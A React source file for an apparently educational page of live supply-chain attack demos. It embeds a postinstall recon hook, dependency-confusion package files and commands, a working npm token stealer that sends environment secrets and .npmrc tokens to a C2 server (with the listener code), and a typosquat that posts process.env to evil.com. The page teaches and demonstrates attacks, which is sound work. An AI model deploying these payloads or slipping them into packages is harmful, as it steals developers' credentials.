import { useState } from 'react';
import { FiPlay, FiLoader } from 'react-icons/fi';
import CodeBlock from '../components/CodeBlock';

const postinstallCode = `const os = require('os');
const fs = require('fs');
const path = require('path');

console.log('');
console.log('=======================================================');
console.log('  !! MALICIOUS POSTINSTALL HOOK SIMULATION !!');
console.log('=======================================================');
console.log('');
console.log('  [ATTACK] This ran AUTOMATICALLY on npm install');
console.log('');
console.log('  Hostname:  ' + os.hostname());
console.log('  Username:  ' + os.userInfo().username);
console.log('  Platform:  ' + os.platform() + ' ' + os.arch());
console.log('  Home Dir:  ' + os.homedir());
console.log('  Node Ver:  ' + process.version);
console.log('');

// Check for sensitive files
const checks = ['.ssh/id_rsa', '.aws/credentials', '.npmrc', '.env'];
checks.forEach(f => {
  const exists = fs.existsSync(path.join(os.homedir(), f));
  console.log('  [' + (exists ? 'FOUND' : '  --  ') + '] ~/' + f);
});

console.log('');
console.log('  [SAFE] Demo only. No data exfiltrated.');
console.log('=======================================================');`;

const confusionPrivate = `{
  "name": "mycompany-internal-utils",
  "version": "1.2.3",
  "description": "Legitimate internal package"
}`;

const confusionMalicious = `{
  "name": "mycompany-internal-utils",
  "version": "99.0.0",
  "description": "MALICIOUS - higher version wins!",
  "scripts": {
    "preinstall": "node malicious.js"
  }
}`;

const confusionSteps = `# 1. Install local npm registry
npm install -g verdaccio && verdaccio &

# 2. Publish "private" package v1.2.3
cd private-package
npm publish --registry http://localhost:4873

# 3. Publish "malicious" package v99.0.0
cd ../malicious-package
npm publish --registry http://localhost:4873

# 4. Victim installs — gets v99.0.0!
cd ../victim-app
npm install --registry http://localhost:4873
# => npm picks 99.0.0 because higher version wins
# => preinstall hook runs automatically!`;

const tokenStealerPackageJson = `{
  "name": "csec-form-helpers",
  "version": "1.0.0",
  "description": "Lightweight form validation & sanitization helpers",
  "main": "index.js",
  "scripts": {
    "postinstall": "node postinstall.js"
  }
}`;

const tokenStealerIndex = `// csec-form-helpers — looks like a perfectly normal library
function validateEmail(email) {
  return /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(email);
}
function sanitizeInput(str) {
  return str.replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function validatePassword(pw) {
  return { length: pw.length >= 8, upper: /[A-Z]/.test(pw), valid: pw.length >= 8 };
}
module.exports = { validateEmail, sanitizeInput, validatePassword };
// ^ Everything works. Developer is happy. Tests pass.`;

const tokenStealerPayload = `const os = require('os');
const fs = require('fs');
const path = require('path');
const http = require('http');

const C2_HOST = '127.0.0.1';   // attacker's server
const C2_PORT = 4444;

// ── PHASE 1: System Recon ────────────────────────
const systemInfo = {
  hostname: os.hostname(),
  username: os.userInfo().username,
  platform: os.platform() + ' ' + os.arch(),
  home: os.homedir(),
  cwd: process.cwd(),
};

// ── PHASE 2: Steal Tokens from Environment ───────
const TOKEN_KEYS = [
  'GITHUB_TOKEN', 'GH_TOKEN', 'NPM_TOKEN',
  'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY',
  'DATABASE_URL', 'API_KEY', 'JWT_SECRET',
  'VERCEL_TOKEN', 'DOCKER_PASSWORD',
];
const stolenTokens = {};
TOKEN_KEYS.forEach(key => {
  if (process.env[key]) stolenTokens[key] = process.env[key];
});

// ── PHASE 3: Scan for Sensitive Files ────────────
const SENSITIVE = ['.ssh/id_rsa', '.aws/credentials', '.npmrc', '.env'];
const foundFiles = SENSITIVE.filter(f =>
  fs.existsSync(path.join(os.homedir(), f))
);

// ── PHASE 4: Read .npmrc for auth tokens ─────────
let npmrcTokens = null;
try {
  npmrcTokens = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf-8')
    .split('\\n').filter(l => l.includes('token')).join('\\n');
} catch {}

// ── PHASE 5: Send Everything to C2 ──────────────
const payload = JSON.stringify({
  timestamp: new Date().toISOString(),
  system: systemInfo,
  stolen_tokens: stolenTokens,
  sensitive_files: foundFiles,
  npmrc_tokens: npmrcTokens,
});

const req = http.request({
  hostname: C2_HOST, port: C2_PORT,
  path: '/exfil', method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  timeout: 3000,
}, () => {});
req.on('error', () => {}); // fail silently
req.end(payload);
// Developer sees: "Setting up csec-form-helpers... Done."
// Attacker sees: ALL their tokens, SSH keys, and credentials.`;

const c2ServerCode = `const http = require('http');
const PORT = 4444;

let victims = 0;

http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/exfil') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      victims++;
      const data = JSON.parse(body);
      console.log('\\n[!] VICTIM #' + victims + ' — STOLEN DATA:');
      console.log('  Hostname:', data.system?.hostname);
      console.log('  Username:', data.system?.username);
      console.log('  Tokens:', JSON.stringify(data.stolen_tokens, null, 2));
      console.log('  Files:', data.sensitive_files);
      res.end('received');
    });
  }
}).listen(PORT, () => {
  console.log('[C2] Listening on port ' + PORT);
  console.log('[C2] Waiting for stolen tokens...');
});`;

const tokenStealerSteps = `# ── TERMINAL 1: Start the attacker's C2 server ──
cd demos/token-stealer/c2-server
node server.js

# ── TERMINAL 2: Set fake tokens, then "install" the package ──
export GITHUB_TOKEN="ghp_abc123secrettoken456"
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfi"
export NPM_TOKEN="npm_1234567890abcdef"
export DATABASE_URL="postgres://admin:s3cret@db:5432/app"

cd demos/token-stealer/victim-app
npm install    # ← postinstall hook fires, tokens stolen!

# ── Check TERMINAL 1 — all tokens appear on the C2 server ──

# ── TERMINAL 2: Run the app — everything works normally ──
node app.js    # ← email validation, password checks all pass`;

const typosquatCode = `// Package: "lodahs" (typosquat of "lodash")

// Step 1: Re-export the real package (stealth)
module.exports = require('lodash');

// Step 2: Silently steal credentials
const https = require('https');
const data = JSON.stringify(process.env);
https.request({
  hostname: 'evil.com',
  path: '/steal',
  method: 'POST'
}).end(data);
// Developer never notices — lodash works normally`;

function DemoCard({ title, description, tag, children, runnable, onRun }) {
  const [running, setRunning] = useState(false);
  const [output, setOutput] = useState(null);

  const handleRun = async () => {
    setRunning(true);
    setOutput(null);
    try {
      const base = import.meta.env.VITE_SCRIPTS_API_URL || '';
      const res = await fetch(`${base}/run/demo`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ demo: onRun }) });
      const data = await res.json();
      setOutput(data.output);
    } catch {
      setOutput('[!] Could not reach the scripts API.\n[i] Start the FastAPI server: cd scripts-api && uvicorn main:app --port 8000\n[i] Or run directly: cd demos/malicious-postinstall && node malicious.js');
    }
    setRunning(false);
  };

  return (
    <div className="demo-card">
      <div className="demo-card-header">
        <div>
          <h3>{title}</h3>
          <span style={{ fontFamily: 'var(--font-mono)', fontSize: '0.78rem', color: 'var(--text-muted)' }}>{tag}</span>
        </div>
        {runnable && (
          <button className="demo-run-btn" onClick={handleRun} disabled={running}>
            {running ? <><FiLoader className="spin" /> Running...</> : <><FiPlay /> Run Demo</>}
          </button>
        )}
      </div>
      <div className="demo-card-body">
        <p>{description}</p>
        {children}
        {output && <div className="demo-output">{output}</div>}
      </div>
    </div>
  );
}

export default function Demos() {
  return (
    <div className="page">
      <div className="page-header">
        <div className="page-tag">Part 3</div>
        <h1>Live Demos</h1>
        <p>Interactive demonstrations showing how supply chain attacks work in practice. Run them live or walk through the code.</p>
      </div>

      <DemoCard
        title="Malicious Postinstall Hook"
        description="Demonstrates how npm lifecycle hooks (postinstall) can execute arbitrary code the moment you run npm install. This is the primary mechanism used in dependency confusion and typosquatting attacks."
        tag="Demo A // Automatic Code Execution"
        runnable
        onRun="postinstall"
      >
        <CodeBlock language="javascript" filename="malicious.js" code={postinstallCode} />
      </DemoCard>

      <DemoCard
        title="Dependency Confusion Attack"
        description="Shows how npm resolves packages when the same name exists in both private and public registries. The higher version (attacker's v99.0.0) wins over the legitimate internal v1.2.3."
        tag="Demo B // Version Resolution Exploit"
      >
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
          <CodeBlock language="json" filename="private/package.json (v1.2.3)" code={confusionPrivate} />
          <CodeBlock language="json" filename="malicious/package.json (v99.0.0)" code={confusionMalicious} />
        </div>
        <CodeBlock language="bash" filename="step-by-step commands" code={confusionSteps} />
      </DemoCard>

      <DemoCard
        title="Token Stealer — Full Supply Chain Attack"
        description="End-to-end demo: A legitimate-looking npm package (form validation helpers) with a hidden postinstall payload that steals GITHUB_TOKEN, AWS keys, SSH keys, .npmrc tokens, and sends everything to the attacker's C2 server. The package works perfectly — the developer never suspects anything."
        tag="Demo D // Token Exfiltration via Postinstall Hook"
        runnable
        onRun="token-stealer"
      >
        <h4 style={{ color: 'var(--accent-cyan)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 1: The "Legitimate" Package (index.js)</h4>
        <p style={{ fontSize: '0.9rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>
          This is what the developer sees — clean, useful form validation code. Nothing suspicious.
        </p>
        <CodeBlock language="javascript" filename="csec-form-helpers/index.js" code={tokenStealerIndex} />

        <h4 style={{ color: 'var(--accent-red)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 2: The Hidden Payload (postinstall.js)</h4>
        <p style={{ fontSize: '0.9rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>
          This runs AUTOMATICALLY during <code>npm install</code>. It steals tokens, scans for SSH keys, reads .npmrc, and sends everything to the attacker's server. The developer never sees it execute.
        </p>
        <CodeBlock language="javascript" filename="csec-form-helpers/postinstall.js — THE PAYLOAD" code={tokenStealerPayload} />

        <h4 style={{ color: 'var(--accent-amber)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 3: The package.json (postinstall trigger)</h4>
        <CodeBlock language="json" filename="csec-form-helpers/package.json" code={tokenStealerPackageJson} />

        <h4 style={{ color: 'var(--accent-purple)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 4: Attacker's C2 Listener</h4>
        <p style={{ fontSize: '0.9rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>
          A simple Node.js server that receives and displays all stolen credentials in real-time.
        </p>
        <CodeBlock language="javascript" filename="c2-server/server.js" code={c2ServerCode} />

        <h4 style={{ color: 'var(--accent-green)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 5: Run It Live</h4>
        <CodeBlock language="bash" filename="live demo — two terminals" code={tokenStealerSteps} />
      </DemoCard>

      <DemoCard
        title="Typosquatting Package"
        description='Shows how a typosquat package (e.g., "lodahs" instead of "lodash") re-exports the legitimate package for stealth while silently exfiltrating credentials in the background.'
        tag="Demo C // Name Impersonation"
      >
        <div className="illustration" style={{ marginBottom: '1rem' }}>
          <div className="illustration-label">How typosquatting works</div>
          <div className="illustration-content">
            <div className="flow-diagram">
              <div className="flow-box victim">
                <h5>Developer</h5>
                <p>npm install lodahs</p>
              </div>
              <span className="flow-arrow danger">&rarr;</span>
              <div className="flow-box attacker">
                <h5>Typosquat Pkg</h5>
                <p>"lodahs" (not lodash)</p>
              </div>
              <span className="flow-arrow danger">&rarr;</span>
              <div className="flow-box compromised">
                <h5>Re-exports Real</h5>
                <p>require('lodash')</p>
              </div>
              <span className="flow-arrow">&rarr;</span>
              <div className="flow-box">
                <h5>Everything Works</h5>
                <p>Credentials silently stolen</p>
              </div>
            </div>
          </div>
        </div>
        <CodeBlock language="javascript" filename='typosquat: "lodahs"' code={typosquatCode} />
      </DemoCard>

      <div className="media-section">
        <h2>Video Walkthroughs</h2>
        <div className="video-grid">
          <div className="video-embed">
            <iframe
              src="https://www.youtube.com/embed/MV0XJQf8tT0"
              title="Dependency Confusion Explained"
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
              allowFullScreen
            />
            <div className="video-caption">
              <span className="yt-icon">&#9654;</span> Dependency Confusion Explained &mdash; Supply Chain Attack
            </div>
          </div>
          <div className="video-embed">
            <iframe
              src="https://www.youtube.com/embed/7ZcRNvmRz6E"
              title="Finding Dependency Confusion in Web Apps"
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
              allowFullScreen
            />
            <div className="video-caption">
              <span className="yt-icon">&#9654;</span> How to find Dependency Confusion in web apps &mdash; Bug Bounty
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
